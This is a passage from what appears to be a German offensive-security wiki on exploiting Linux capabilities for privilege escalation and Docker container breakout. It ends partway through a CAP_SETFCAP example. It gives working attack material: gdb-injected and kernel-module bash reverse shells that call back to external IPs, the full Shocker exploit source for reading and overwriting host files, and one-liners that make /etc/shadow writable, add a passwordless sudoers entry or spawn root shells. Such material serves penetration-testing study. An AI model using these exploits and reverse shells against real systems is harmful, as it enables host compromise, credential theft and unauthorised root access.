Wenn **GDB** installiert ist (oder du es beispielsweise mit `apk add gdb` oder `apt install gdb` installieren kannst), kannst du einen **sichtbaren Host-Prozess debuggen** und ihn die Funktion `system` aufrufen lassen. Dafür sind effektives `CAP_SYS_PTRACE` im User-Namespace des Ziels und Sichtbarkeit der Host-PIDs erforderlich; `CAP_SYS_ADMIN` ist **nicht** erforderlich. Yama, ein nicht dumpbarer Zustand, seccomp und LSM-Richtlinien können das Attach dennoch verhindern.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Du kannst die Ausgabe des ausgeführten Befehls nicht sehen, aber er wird von diesem Prozess ausgeführt (hol dir also eine rev shell).

> [!WARNING]
> Wenn du den Fehler "No symbol "system" in current context." erhältst, sieh dir das vorherige Beispiel an, in dem Shellcode über gdb in ein Programm geladen wird.

**Beispiel mit Umgebung (Docker breakout) – Shellcode Injection**

Du kannst die aktivierten Capabilities im Docker-Container mit folgendem Befehl überprüfen:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

List **Prozesse**, die auf dem **host** laufen `ps -eaf`

1. Ermittle die **Architektur** `uname -m`
2. Finde einen **Shellcode** für die Architektur ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Finde ein **Programm**, um den **Shellcode** in den Prozessspeicher zu **injecten** ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Passe** den **Shellcode** im Programm an und **kompiliere** es `gcc inject.c -o inject`
5. **Injecte** ihn und hole dir deine **Shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** befähigt einen Prozess, Kernel-Module zu **laden und zu entladen (`init_module(2)`, `finit_module(2)` und `delete_module(2)`-Systemaufrufe)**, und gewährt damit direkten Zugriff auf die zentralen Operationen des Kernels. Diese Capability birgt kritische Sicherheitsrisiken, da das Laden eines Moduls das Verhalten des Kernels verändern und Isolationsgrenzen überwinden kann.<sup>[[6]](#references)[[14]](#references)</sup>
In einem gewöhnlichen Rootful-Linux-Container zielt dies auf den **gemeinsam genutzten Host-Kernel** und ermöglicht somit einen direkten Ausbruch. Die Capability muss im initialen User-Namespace wirksam sein, da das Laden von Modulen nicht namespaced ist. Eine User-Space-Kernel- oder VM-isolierte Laufzeitumgebung wie gVisor, Kata oder Hyper-V verändert, welche Kernelgrenze erreichbar ist. Das Laden von Modulen kann weiterhin durch `modules_disabled`, Kernel-Lockdown, Signaturerzwingung, seccomp oder ein LSM blockiert werden.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

Im folgenden Beispiel verfügt das Binary **`python`** über diese Capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Standardmäßig sucht der Befehl **`modprobe`** im Verzeichnis **`/lib/modules/$(uname -r)`** nach Abhängigkeitslisten- und Map-Dateien.\
Um dies auszunutzen, erstellen wir einen gefälschten **lib/modules**-Ordner:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Kompiliere anschließend **das Kernelmodul, von dem du unten 2 Beispiele findest, und kopiere** es in diesen Ordner:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Führe schließlich den erforderlichen Python-Code aus, um dieses Kernelmodul zu laden:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Beispiel 2 mit Binärdatei**

Im folgenden Beispiel verfügt die Binärdatei **`kmod`** über diese Capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Das bedeutet, dass der Befehl **`insmod`** verwendet werden kann, um ein Kernelmodul einzufügen. Folge dem folgenden Beispiel, um diese Berechtigung für eine **reverse shell** auszunutzen.

**Beispiel mit Umgebung (Docker breakout)**

Mit folgendem Befehl kannst du die aktivierten Capabilities im Docker-Container überprüfen:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

In der vorherigen Ausgabe ist zu sehen, dass die Capability **SYS_MODULE** aktiviert ist.<sup>[[14]](#references)</sup>

**Erstelle** das **kernel module**, das eine Reverse Shell ausführt, und die **Makefile**, um es zu **kompilieren**:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Das Leerzeichen vor jedem make-Wort in der Makefile **muss ein Tabulator sein, keine Leerzeichen**!

Führe `make` aus, um es zu kompilieren.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Starten Sie schließlich `nc` in einer Shell und **laden Sie das Modul** aus einer anderen Shell. Dadurch fangen Sie die Shell im `nc`-Prozess ab:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Der Code für diese Technik wurde aus dem Labor „Abusing SYS_MODULE Capability“ kopiert:** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Ein weiteres Beispiel für diese Technik findet sich unter [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht es einem Prozess, **Berechtigungsprüfungen zum Lesen von Dateien sowie zum Lesen und Ausführen von Verzeichnissen zu umgehen**. Außerdem erlaubt sie `open_by_handle_at(2)`, das einen gültigen Dateihandle relativ zu einem Mount-Dateideskriptor für dasselbe eingehängte Dateisystem interpretiert. Dadurch werden nicht automatisch alle Dateien außerhalb des Mount-Namespace des Prozesses zugänglich. Ein Ausbruch über Dateihandles erfordert zusätzlich eine für den Host relevante Dateisystemreferenz, gültige oder auffindbare Handles, ein kompatibles Dateisystem und Speicherlayout sowie das Ausbleiben einer Blockierung durch die Runtime oder ein LSM. Die historische Docker-Technik „Shocker“ demonstrierte eine solche Kombination in betroffenen Layouts, wie [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analysiert.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Das bedeutet, dass du Prüfungen der Dateileseberechtigungen und der Lese-/Ausführungsberechtigungen für Verzeichnisse umgehen kannst**.<sup>[[14]](#references)</sup>

Bei einer **benutzerdefinierten ausführbaren Datei** mit dieser Capability solltest du prüfen, was sie liest und an ihren Aufrufer zurückgibt. Ein Hilfsprogramm zum Durchsuchen von Dateien, das einen vom Aufrufer gewählten geschützten Pfad und eine vom Aufrufer gewählte Präfixlänge akzeptiert und anschließend einen vollständigen Hash dieses Präfixes offenlegt, kann als File-Read-Oracle dienen: Nachdem die ersten `n-1` Bytes ermittelt wurden, lassen sich die möglichen Digests für jedes nächste Byte mit dem vom Hilfsprogramm für die Länge `n` ausgegebenen Digest vergleichen. Dies hängt weder davon ab, eine kryptografische Kollision zu finden, noch speziell von MD5; entscheidend sind wiederholte Abfragen mit frei wählbarer Länge und sichtbare, deterministische Digests. Ein Digest der gesamten Datei ohne Kontrolle über das Präfix belegt nicht denselben Angriffsweg. Stelle sicher, dass der Aufrufer das Hilfsprogramm ausführen kann, seine File-Capability wirksam wird, der gewählte Pfad in seinem Mount-Namespace erreichbar ist und das beschriebene Ein-/Ausgabeverhalten tatsächlich vorliegt. Führe während der passiven Enumeration kein unbekanntes privilegiertes Hilfsprogramm aus, nur um dies zu testen.

**Beispiel mit Binary**

Das Binary kann Dateien lesen, die in seinen Namespaces zugänglich sind. Wenn also eine Datei wie `tar` diese Capability besitzt, kann sie die Shadow-Datei lesen:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Beispiel mit binary2**

Nehmen wir in diesem Fall an, dass die Binärdatei **`python`** diese Capability besitzt. Um Root-Dateien aufzulisten, könntest du Folgendes tun:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

Und um eine Datei zu lesen, könntest du Folgendes tun:

```python
print(open("/etc/shadow", "r").read())
```

**Beispiel in der Umgebung (Docker breakout)**

Du kannst die aktivierten Capabilities im Docker-Container mit `capsh --print` überprüfen.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

In der vorherigen Ausgabe ist zu sehen, dass die Capability **DAC_READ_SEARCH** aktiviert ist. Sie umgeht DAC-Lese- und Suchprüfungen und erlaubt `open_by_handle_at(2)`; sie ist keine Capability zum Debuggen von Prozessen.<sup>[[14]](#references)</sup>

Wie der folgende Exploit funktioniert, erfährst du unter [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). Kurz gesagt ermöglicht **CAP_DAC_READ_SEARCH** das Durchlaufen des Dateisystems ohne Berechtigungsprüfungen und erlaubt `open_by_handle_at(2)`; dadurch können Dateien offengelegt werden, die von anderen Prozessen geöffnet wurden, sofern die relevanten Namespaces und Mounts erreichbar sind.<sup>[[13]](#references)[[14]](#references)</sup>

Den ursprünglichen Exploit, der diese Berechtigungen ausnutzt, um Dateien vom Host zu lesen, findest du hier: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); im Folgenden findest du eine **modifizierte Version, mit der du die zu lesende Datei als erstes Argument übergeben und das Ergebnis in eine Datei schreiben kannst**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Der Exploit muss einen Zeiger auf etwas finden, das auf dem Host eingehängt ist. Der ursprüngliche Exploit verwendete die Datei /.dockerinit, diese modifizierte Version verwendet /etc/hostname. Wenn der Exploit nicht funktioniert, musst du möglicherweise eine andere Datei festlegen. Um eine Datei zu finden, die auf dem Host eingehängt ist, führe einfach den Befehl mount aus:

![CAP SYS MODULE - CAP DAC READ SEARCH: Der Exploit muss einen Zeiger auf etwas finden, das auf dem Host eingehängt ist. Der ursprüngliche Exploit verwendete die Datei /.dockerinit, diese modifizierte Version verwendet ...](<../../images/image (407) (1).png>)

**Der Code für diese Technik wurde aus dem Labor „Abusing DAC_READ_SEARCH Capability“ von** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) kopiert.<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Diese Capability umgeht Prüfungen der Datei-Lese- und Schreibberechtigungen sowie die meisten Prüfungen der Ausführungsberechtigungen**; zum Ausführen einer regulären Datei muss weiterhin mindestens ein Ausführungsbit gesetzt sein. Sie setzt weder einen schreibgeschützten Mount noch einen unveränderlichen Zustand oder eine Ablehnung durch ein LSM außer Kraft.<sup>[[14]](#references)</sup>

Suche nach Dateien, die durch die Mitgliedschaft in einer privilegierten Gruppe lesbar oder beschreibbar werden; welche Ziele geeignet sind, hängt von den Eigentümer- und Modusbits des Ziels ab.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

In diesem Beispiel verfügt vim über diese Capability, sodass du jede Datei wie _passwd_, _sudoers_ oder _shadow_ ändern kannst:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Beispiel mit Binary 2**

In diesem Beispiel verfügt das **`python`**-Binary über diese Capability. Du könntest python verwenden, um jede Datei zu überschreiben:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Beispiel mit Umgebung + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` erlaubt `open_by_handle_at(2)`, umgeht aber **nicht** die Schreibberechtigungsprüfungen. Das Schreiben über einen aufgelösten Handle erfordert zusätzlich Schreibzugriff für die effektive Dateisystem-UID/GID des Prozesses oder über eine ACL oder `CAP_DAC_OVERRIDE`. Auch die für den Host relevante Dateisystemreferenz, unterstützte Datei-Handles, ein beschreibbarer Mount und die Runtime-/LSM-Richtlinien müssen den Vorgang erlauben. Prüfe die effektiven Capabilities und die Identität; keine der beiden Capabilities allein beweist, dass ein beschreibbares Host-Ziel verfügbar ist. Siehe [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) und [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Lies zuerst den vorherigen Abschnitt über [**den Missbrauch der DAC_READ_SEARCH capability zum Lesen beliebiger Dateien**](linux-capabilities.md#cap_dac_read_search) des Hosts und **kompiliere** den exploit.\
Das folgende historische Beispiel versucht, eine aufgelöste Datei mit `O_RDWR` zu öffnen; dies gelingt nur, wenn die zuvor genannten Dateisystem- und Schreibberechtigungsbedingungen erfüllt sind:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Um aus dem Docker-Container zu entkommen, könnten Sie die Dateien `/etc/shadow` und `/etc/passwd` vom Host **herunterladen**, ihnen einen **neuen Benutzer hinzufügen** und sie mit **`shocker_write`** überschreiben. Anschließend können Sie sich per **SSH anmelden**.

**Der Code für diese Technik wurde aus dem Labor „Abusing DAC_OVERRIDE Capability“ kopiert:** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Diese Capability ermöglicht es einem Prozess, den Eigentümer von Dateien zu ändern**.<sup>[[14]](#references)</sup>

**Beispiel mit einem Binary**

Angenommen, das **`python`**-Binary verfügt über diese Capability: Sie können den Eigentümer einer Datei wie **`shadow`** ändern und den dadurch erhaltenen Zugriff nutzen, um die Datei zu bearbeiten, sofern andere Berechtigungen dies zulassen:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Oder mit der **`ruby`**-Binärdatei, die über diese Capability verfügt:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Diese Capability umgeht bei vielen Dateioperationen die Eigentumsprüfungen, einschließlich beim Ändern von Berechtigungen**.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binary**

Wenn Python diese Capability hat, kannst du die Berechtigungen der shadow-Datei ändern, **das root-Passwort ändern** und deine Privilegien erweitern:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Diese Capability ermöglicht es einem Prozess, seine effektive Benutzer-ID zu ändern, vorbehaltlich der vom Kernel durchgesetzten Regeln für Credentials und Capabilities**.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binärdatei**

Wenn Python über diese **Capability** verfügt, kannst du sie sehr einfach missbrauchen, um deine Privilegien bis zu root zu erweitern:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Eine andere Möglichkeit:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Bei einer **benutzerdefinierten** ausführbaren Datei mit effektivem `CAP_SETUID` solltest du den erreichbaren Codepfad untersuchen, statt anzunehmen, dass die Capability allein eine Shell ermöglicht. Vom Aufrufer kontrollierter Text, der als *Formatzeichenfolge* an [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) übergeben wird, kann Prozessspeicher offenlegen oder verändern; ein nutzbarer Privilegienwechsel hängt jedoch weiterhin von einem verwundbaren Aufruf, kontrollierbaren Eingaben und einer späteren Aktion nach `setuid(0)` ab. Wenn diese Aktion einen externen Helfer anhand seines Namens startet, überprüfe die effektive Identität zum Zeitpunkt des Starts, den tatsächlichen `PATH` und ob ein früher durchsuchtes Verzeichnis für den Aufrufer beschreibbar und durchsuchbar ist. Eine unwirksame File Capability, `no_new_privs`, ein festgelegter vertrauenswürdiger Pfad zum Helfer oder ein nicht erreichbarer Zweig ändern das Ergebnis. Untersuche die Binärdatei oder verfügbaren Quellcode offline; führe bei einer routinemäßigen Bestandsaufnahme keinen verdächtigen privilegierten Helfer aus.

## CAP_SETGID

**Diese Capability ermöglicht einem Prozess, seine effektive Gruppen-ID zu ändern, vorbehaltlich der vom Kernel durchgesetzten Regeln für Anmeldedaten und Capabilities**.<sup>[[14]](#references)</sup>

Es gibt viele Dateien, die du **überschreiben kannst, um Privilegien zu erlangen**; [**hier findest du Anregungen**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Beispiel mit einer Binärdatei**

In diesem Fall solltest du nach interessanten Dateien suchen, die eine Gruppe lesen kann, da du dich als beliebige Gruppe ausgeben kannst:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Sobald du eine Datei gefunden hast, die du zur Rechteausweitung missbrauchen kannst (durch Lesen oder Schreiben), kannst du **eine Shell mit der Identität der interessanten Gruppe öffnen** mit:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In diesem Fall wurde die Identität der Gruppe shadow angenommen, sodass du die Datei `/etc/shadow` lesen kannst:

```bash
cat /etc/shadow
```

### Kombinierte Chain: CAP_SETGID + CAP_CHOWN

Wenn beide Capabilities im selben Helper verfügbar sind, ist eine praktische Chain:

1. EGID zu `shadow` (oder einer anderen privilegierten Gruppe) wechseln.
2. Mit `chown` die UID von `/etc/shadow` auf deine UID setzen und dabei die Gruppe `shadow` beibehalten.
3. Einen Ziel-Hash auslesen und cracken/zu einem anderen Ziel pivotieren.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Dadurch muss nicht direkt vollständiger Root-Zugriff erlangt werden, und es reicht häufig aus, um sich über die Wiederverwendung von Zugangsdaten weiterzubewegen.

Wenn **docker** installiert ist, kannst du die **docker-Gruppe** **impersonate**n und sie missbrauchen, um mit dem [**docker socket** zu kommunizieren und deine Privilegien zu erhöhen](#writable-docker-socket).

## CAP_SETFCAP

**Diese Capability ermöglicht es einem Prozess, Datei-Capabilities festzulegen**.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binary**

Wenn Python über diese **Capability** verfügt, kannst du sie sehr einfach missbrauchen, um deine Privilegien auf Root zu erhöhen:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
